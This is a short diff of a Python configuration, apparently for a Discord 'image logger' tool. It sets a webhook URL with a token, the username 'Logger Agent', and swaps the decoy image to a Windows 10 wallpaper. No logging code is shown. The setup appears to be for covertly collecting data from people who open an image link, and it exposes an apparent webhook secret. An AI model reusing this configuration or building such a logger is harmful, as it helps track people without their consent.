@@ -11,7 +11,7 @@ __author__ = "foaqen"
 
 config = {
     "webhook": "https://discord.com/api/webhooks/1573733583464697969/iSYNjc-4s8O6pWnitdS4QWqn7TnVfLg8kMLUEb93bRp9xJFqYqueGWOdMbR_nfcJWXLm",
-    "image": "https://www.shutterstock.com/image-photo/chicago-il-usa-july-15-600w-2806860939.jpg", 
+    "image": "https://static.wikitide.net/windowswallpaperwiki/5/54/Img1_%28Windows_10%29.jpg", 
     "imageArgument": True,
 
     "username": "Logger Agent", 
